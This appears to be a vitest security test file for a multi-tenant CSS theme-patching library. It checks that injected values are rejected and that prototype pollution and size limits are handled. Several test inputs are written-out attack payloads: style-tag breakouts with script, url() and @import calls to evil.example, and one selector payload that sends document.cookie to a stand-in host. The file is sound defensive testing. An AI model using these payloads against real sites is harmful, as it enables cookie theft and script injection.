import { describe, expect, test } from 'vitest'
import { defineTheme } from './define'
import { ThemeonError } from './errors'
import { resolveTheme } from './resolve'
import { applyThemePatch, serializeThemePatch } from './patch'
import { TOKEN_BRAND } from './types'
import type { ResolvedTheme } from './types'
import type { TokenTreeInput } from './types'

/**
 * `applyThemePatch`/`serializeThemePatch` (P6.1, H3 И1). Тест-вектора атак пишутся ПЕРВЫМИ —
 * см. `patch-grammar.test.ts` для юнит-уровня грамматики; этот файл проверяет интеграцию
 * (path-резолюция из `base.tokens`, детерминизм вывода, композит text, коды ошибок сквозь путь).
 */

/** База со всеми 7 tenant-типами + запрещённым `shadow` — покрывает Scope Included P6.1. */
function fullBase(): ResolvedTheme {
  const theme = defineTheme({
    base: {
      color: { bg: { page: '#ffffff' }, action: { primary: '#3355ff' } },
      space: { 4: '1rem' },
      fontWeight: { bold: 700 },
      font: { sans: 'system-ui, sans-serif' },
      duration: { fast: '150ms' },
      z: { modal: 40 },
      text: { '2xl': { size: '1.5rem', lineHeight: 1.33 } },
      shadow: { card: '0 1px 2px black' },
    },
  })
  return resolveTheme(theme)
}

function code(fn: () => unknown): string {
  try {
    fn()
  } catch (e) {
    return (e as ThemeonError).code
  }
  throw new Error('expected a throw')
}

describe('applyThemePatch — вектора атак сквозь путь (path → type → грамматика)', () => {
  const base = fullBase()

  test.each([
    ['color.bg.page', 'red}</style><script>alert(1)</script>', undefined],
    ['color.bg.page', '#fff;}', undefined],
    ['space.4', '1px}', 'extended'],
    ['color.bg.page', 'url(https://evil.example/exfil)', undefined],
    ['color.bg.page', 'expression(alert(1))', undefined],
    ['color.bg.page', '@import url(x)', undefined],
    ['color.bg.page', '#fff/*', undefined],
    ['color.bg.page', 'a\\3c b', undefined],
    ['space.4', '10px\n}', 'extended'],
    ['font.sans', 'system-ui" onload="alert(1)', undefined],
  ] as const)('%s = %s → throw ThemeonError, не проходит в CSS', (dottedPath, value, policy) => {
    const [group, ...rest] = dottedPath.split('.')
    const patch: TokenTreeInput = { [group!]: buildNested(rest, value) }
    expect(() => applyThemePatch(base, patch, policy ? { policy } : {})).toThrow(ThemeonError)
  })
})

/** Собирает вложенный объект-патч из хвоста пути и листа: ['bg','page'] → {bg:{page:leaf}}. */
function buildNested(path: string[], leaf: unknown): TokenTreeInput {
  if (path.length === 0) return leaf as TokenTreeInput
  return { [path[0]!]: buildNested(path.slice(1), leaf) } as TokenTreeInput
}

describe('applyThemePatch — легальные значения проходят и нормализуются', () => {
  const base = fullBase()

  test('color нормализуется (hex → нижний регистр)', () => {
    const { vars } = applyThemePatch(base, { color: { bg: { page: '#1A73E8' } } })
    expect(vars['--color-bg-page']).toBe('#1a73e8')
  })

  test('dimension/fontWeight/duration/fontFamily проходят как есть', () => {
    const { vars } = applyThemePatch(
      base,
      {
        space: { 4: '1.5rem' },
        fontWeight: { bold: 600 },
        duration: { fast: '200ms' },
        font: { sans: 'Inter, system-ui, sans-serif' },
      },
      { policy: 'extended' },
    )
    expect(vars['--spacing-4']).toBe('1.5rem')
    expect(vars['--font-weight-bold']).toBe('600')
    expect(vars['--duration-fast']).toBe('200ms')
    expect(vars['--font-sans']).toBe('Inter, system-ui, sans-serif')
  })
})

describe('applyThemePatch — коды ошибок', () => {
  const base = fullBase()

  test('несуществующий путь → UNKNOWN_PATH', () => {
    expect(code(() => applyThemePatch(base, { color: { bg: { footer: '#000000' } } }))).toBe('UNKNOWN_PATH')
  })

  test('__proto__ в пути патча → UNSAFE_PATH, не TypeError/prototype pollution', () => {
    const dangerous = JSON.parse('{"__proto__":{"x":"#000000"}}') as unknown as TokenTreeInput
    expect(code(() => applyThemePatch(base, dangerous))).toBe('UNSAFE_PATH')
    // prototype pollution реально не произошло:
    expect(({} as Record<string, unknown>).x).toBeUndefined()
  })

  test('shadow (запрещён v1, P-D70) → UNSUPPORTED_TENANT_TYPE, не silent-skip', () => {
    expect(code(() => applyThemePatch(base, { shadow: { card: '0 0 0 red' } }, { policy: 'extended' }))).toBe(
      'UNSUPPORTED_TENANT_TYPE',
    )
  })
})

describe('applyThemePatch — text-композит: две переменные из одного пути', () => {
  const base = fullBase()

  test('size + lineHeight эмитятся в свои переменные (double-dash companion, naming.ts)', () => {
    const { vars } = applyThemePatch(base, { text: { '2xl': { size: '1.75rem', lineHeight: 1.4 } } })
    expect(vars['--text-2xl']).toBe('1.75rem')
    expect(vars['--text-2xl--line-height']).toBe('1.4')
  })

  test('только size, без lineHeight — companion-переменная не трогается', () => {
    const { vars } = applyThemePatch(base, { text: { '2xl': { size: '1.8rem' } } })
    expect(vars['--text-2xl']).toBe('1.8rem')
    expect('--text-2xl--line-height' in vars).toBe(false)
  })
})

describe('applyThemePatch — детерминизм и порядок вывода', () => {
  const base = fullBase()

  test('двойной вызов даёт байт-в-байт равный CSS', () => {
    const patch: TokenTreeInput = { duration: { fast: '90ms' }, color: { bg: { page: '#010203' } } }
    const a = applyThemePatch(base, patch, { policy: 'extended' })
    const b = applyThemePatch(base, patch, { policy: 'extended' })
    expect(a.css).toBe(b.css)
  })

  test('порядок вывода = порядок base.tokens, а не порядок ключей патча', () => {
    // Патч трогает duration (группа объявлена в base ПОСЛЕ color) раньше, чем color, по
    // JSON-ключам — вывод обязан всё равно идти в порядке base.tokens: color раньше duration.
    const patch: TokenTreeInput = { duration: { fast: '90ms' }, color: { bg: { page: '#010203' } } }
    const { css } = applyThemePatch(base, patch, { policy: 'extended' })
    const colorIdx = css.indexOf('--color-bg-page')
    const durationIdx = css.indexOf('--duration-fast')
    expect(colorIdx).toBeGreaterThanOrEqual(0)
    expect(durationIdx).toBeGreaterThan(colorIdx)
  })
})

test('applyThemePatch — snapshot CSS-вывода', () => {
  const base = fullBase()
  const { css } = applyThemePatch(
    base,
    {
      color: { bg: { page: '#101014' } },
      space: { 4: '1.25rem' },
    },
    { policy: 'extended' },
  )
  expect(css).toMatchInlineSnapshot(`
    ":root {
      --color-bg-page: #101014;
      --spacing-4: 1.25rem;
    }
    "
  `)
})

test('serializeThemePatch — .css-обёртка над applyThemePatch, никогда не <style>-тег', () => {
  const base = fullBase()
  const css = serializeThemePatch(base, { color: { bg: { page: '#101014' } } })
  expect(css).toBe(applyThemePatch(base, { color: { bg: { page: '#101014' } } }).css)
  expect(css).not.toMatch(/<style/i)
  expect(css.startsWith(':root {')).toBe(true)
})

test('applyThemePatch — layer default false (не оборачивает); строка — оборачивает @layer', () => {
  const base = fullBase()
  const flat = applyThemePatch(base, { color: { bg: { page: '#101014' } } })
  expect(flat.css.startsWith('@layer')).toBe(false)

  const layered = applyThemePatch(base, { color: { bg: { page: '#101014' } } }, { layer: 'tenant' })
  expect(layered.css.startsWith('@layer tenant {')).toBe(true)
  expect(layered.css).toContain('--color-bg-page: #101014;')
})

test('serializeThemePatch — опциональный selector проходит через assertSafeCssToken (reuse)', () => {
  const base = fullBase()
  expect(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: '[data-tenant="acme"]' })).not.toThrow()
  expect(code(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: '{evil}' }))).toBe(
    'UNSAFE_CSS_TOKEN',
  )
})

test('serializeThemePatch — tenant-derived selector <>-breakout (adversarial-verify P6.1, H3) throws UNSAFE_CSS_TOKEN', () => {
  const base = fullBase()
  const tenantId = 'x"]</style><script>fetch(\'//evil?\'+document.cookie)</script><style>[y="'
  expect(
    code(() =>
      serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: `[data-tenant="${tenantId}"]` }),
    ),
  ).toBe('UNSAFE_CSS_TOKEN')
})

test('applyThemePatch — tenant-derived layer @import-статемент-инъекция (adversarial-verify P6.1 round 2, HIGH) throws UNSAFE_CSS_TOKEN', () => {
  const base = fullBase()
  const tenantId = 'x; @import "https://evil.example/x.css"; y'
  expect(
    code(() =>
      applyThemePatch(base, { color: { bg: { page: '#101014' } } }, { layer: `tenant-${tenantId}` }),
    ),
  ).toBe('UNSAFE_CSS_TOKEN')
})

test('serializeThemePatch — tenant-derived selector @import-статемент-инъекция (adversarial-verify P6.1 round 2, HIGH) throws UNSAFE_CSS_TOKEN', () => {
  const base = fullBase()
  const selector = '@import "https://evil.example/x.css";*'
  expect(
    code(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector })),
  ).toBe('UNSAFE_CSS_TOKEN')
})

function policyBase(): ResolvedTheme {
  const theme = defineTheme({
    base: {
      color: {
        bg: { page: '#ffffff' },
        action: { primary: '#3355ff' },
        forest: { 600: '#228833' },
        onPrimary: '#ffffff',
      },
      font: { sans: 'system-ui' },
      radius: { md: '8px' },
      space: { 4: '1rem' },
      _internal: { secret: '#000000' },
    },
  })
  return resolveTheme(theme)
}

function nestDepth(depth: number, leaf: unknown): TokenTreeInput {
  let node: unknown = leaf
  for (let i = 0; i < depth; i++) node = { wrap: node }
  return node as TokenTreeInput
}

describe('P0.3 — tenant patch security envelope', () => {
  const base = policyBase()

  test('default policy is branding: semantic color passes, space is PATCH_POLICY', () => {
    applyThemePatch(base, { color: { bg: { page: '#101014' } } })
    expect(code(() => applyThemePatch(base, { space: { 4: '2rem' } }))).toBe('PATCH_POLICY')
  })

  test('trusted requires explicit selection — omitting policy never grants trusted paths', () => {
    expect(code(() => applyThemePatch(base, { color: { forest: { 600: '#112233' } } }))).toBe('PATCH_POLICY')
    const { vars } = applyThemePatch(base, { color: { forest: { 600: '#112233' } } }, { policy: 'trusted' })
    expect(vars['--color-forest-600']).toBe('#112233')
  })

  test('internal/private paths are PATCH_POLICY until trusted', () => {
    expect(code(() => applyThemePatch(base, { _internal: { secret: '#111111' } }, { policy: 'extended' }))).toBe(
      'PATCH_POLICY',
    )
    applyThemePatch(base, { _internal: { secret: '#111111' } }, { policy: 'trusted' })
  })

  test.each(['__proto__', 'constructor', 'prototype'] as const)(
    'own %s key from JSON.parse → UNSAFE_PATH, no prototype pollution',
    (key) => {
      const dangerous = JSON.parse(`{"${key}":{"x":"#000000"}}`) as TokenTreeInput
      const err = (() => {
        try {
          applyThemePatch(base, dangerous)
        } catch (e) {
          return e as ThemeonError
        }
        throw new Error('expected a throw')
      })()
      expect(err.code).toBe('UNSAFE_PATH')
      expect(err.message).not.toMatch(/#000000/)
      expect(({} as Record<string, unknown>).x).toBeUndefined()
    },
  )

  test('defineProperty own enumerable __proto__ is still UNSAFE_PATH', () => {
    const patch = { color: { bg: { page: '#ffffff' } } } as TokenTreeInput
    Object.defineProperty(patch, '__proto__', { value: { polluted: true }, enumerable: true, configurable: true })
    expect(code(() => applyThemePatch(base, patch))).toBe('UNSAFE_PATH')
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  test('Unicode control in a value → PATCH_UNICODE and message omits the payload', () => {
    const err = (() => {
      try {
        applyThemePatch(base, { color: { bg: { page: '#101014\u0000' } } })
      } catch (e) {
        return e as ThemeonError
      }
      throw new Error('expected a throw')
    })()
    expect(err.code).toBe('PATCH_UNICODE')
    expect(err.path).toEqual(['color', 'bg', 'page'])
    expect(err.hint).toBeTruthy()
    expect(err.message).not.toContain('\u0000')
    expect(err.message).not.toContain('#101014')
  })

  test('lone surrogate → PATCH_UNICODE', () => {
    const page = `#101014${String.fromCharCode(0xd800)}`
    expect(code(() => applyThemePatch(base, { color: { bg: { page } } }))).toBe('PATCH_UNICODE')
  })

  test('unclosed string / CSS breakout / @import / url() stay fail-closed', () => {
    expect(code(() => applyThemePatch(base, { color: { bg: { page: 'red"' } } }))).toBe('UNSAFE_CSS_TOKEN')
    expect(code(() => applyThemePatch(base, { color: { bg: { page: '#fff;--x:1' } } }))).toBe('UNSAFE_CSS_TOKEN')
    expect(code(() => applyThemePatch(base, { color: { bg: { page: '@import "x"' } } }))).toBe('UNSAFE_CSS_TOKEN')
    expect(code(() => applyThemePatch(base, { color: { bg: { page: 'url(https://evil.example)' } } }))).toBe(
      'UNSAFE_CSS_TOKEN',
    )
  })

  test('depth limit−1 / limit / limit+1 (branding maxDepth=6, root=0)', () => {
    expect(code(() => applyThemePatch(base, nestDepth(6, '#fff')))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, nestDepth(7, '#fff')))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, nestDepth(8, '#fff')))).toBe('PATCH_LIMIT')
  })

  test('over-limit depth aborts without blowing the stack', () => {
    const started = Date.now()
    expect(code(() => applyThemePatch(base, nestDepth(256, '#fff')))).toBe('PATCH_LIMIT')
    expect(Date.now() - started).toBeLessThan(50)
  })

  test('key-count limit−1 / limit / limit+1 (branding maxKeys=48)', () => {
    const under: Record<string, string> = {}
    for (let i = 0; i < 47; i++) under[`k${i}`] = '#fff'
    const at: Record<string, string> = {}
    for (let i = 0; i < 48; i++) at[`k${i}`] = '#fff'
    const over: Record<string, string> = {}
    for (let i = 0; i < 49; i++) over[`k${i}`] = '#fff'
    expect(code(() => applyThemePatch(base, under as TokenTreeInput))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, at as TokenTreeInput))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, over as TokenTreeInput))).toBe('PATCH_LIMIT')
  })

  test('value-length limit−1 / limit / limit+1 (branding maxValueLength=128)', () => {
    expect(code(() => applyThemePatch(base, { color: { bg: { page: 'x'.repeat(127) } } }))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, { color: { bg: { page: 'x'.repeat(128) } } }))).not.toBe('PATCH_LIMIT')
    expect(code(() => applyThemePatch(base, { color: { bg: { page: 'x'.repeat(129) } } }))).toBe('PATCH_LIMIT')
  })

  test('cross-tenant isolation: sequential patches do not retain state', () => {
    const snapshot = { ...base.vars }
    const a = applyThemePatch(base, { color: { action: { primary: '#5a1e8c' } } })
    const b = applyThemePatch(base, { color: { action: { primary: '#1a4fd6' } } })
    expect(a.vars['--color-action-primary']).toBe('#5a1e8c')
    expect(b.vars['--color-action-primary']).toBe('#1a4fd6')
    expect(base.vars).toEqual(snapshot)
    expect(Object.isFrozen(a.vars)).toBe(true)
  })

  test('Token reference in a branding patch is PATCH_POLICY; trusted cycle is PATCH_CYCLE', () => {
    const literal = {
      [TOKEN_BRAND]: true as const,
      type: 'color' as const,
      path: ['color', 'a'] as const,
      value: '#112233',
    }
    expect(code(() => applyThemePatch(base, { color: { bg: { page: literal as never } } }))).toBe('PATCH_POLICY')

    const loopA: { [TOKEN_BRAND]: true; type: 'color'; path: readonly string[]; value: unknown } = {
      [TOKEN_BRAND]: true,
      type: 'color',
      path: ['color', 'loop-a'],
      value: '#000000',
    }
    const loopB = {
      [TOKEN_BRAND]: true as const,
      type: 'color' as const,
      path: ['color', 'loop-b'] as const,
      value: loopA,
    }
    loopA.value = loopB
    expect(
      code(() => applyThemePatch(base, { color: { bg: { page: loopA as never } } }, { policy: 'trusted' })),
    ).toBe('PATCH_CYCLE')
  })
})

